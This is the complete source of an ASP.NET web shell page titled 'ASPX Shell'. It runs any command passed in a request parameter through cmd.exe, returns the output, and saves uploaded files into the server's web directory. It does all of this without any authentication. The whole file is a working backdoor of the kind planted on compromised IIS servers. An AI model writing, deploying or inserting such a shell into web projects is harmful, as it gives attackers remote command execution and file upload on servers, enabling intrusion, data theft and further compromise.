<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        if(Request["cmd"] != null) {
            Response.Write("<pre>");
            Response.Write(Server.HtmlEncode(Exec(Request["cmd"])));
            Response.Write("</pre>");
        }
        if(Request["upload"] != null && Request.Files.Count > 0) {
            var file = Request.Files[0];
            var path = Server.MapPath(".") + "\\" + file.FileName;
            file.SaveAs(path);
            Response.Write("Uploaded to: " + path);
        }
    }
    
    string Exec(string cmd) {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c "+cmd);
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        return p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
    }
</script>
<html>
<head>
<title>ASPX Shell</title>
</head>
<body>
<form method="post">
    <input type="text" name="cmd" size="80" />
    <input type="submit" value="Execute" />
</form>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" />
    <input type="submit" name="upload" value="Upload" />
</form>
</body>
</html>
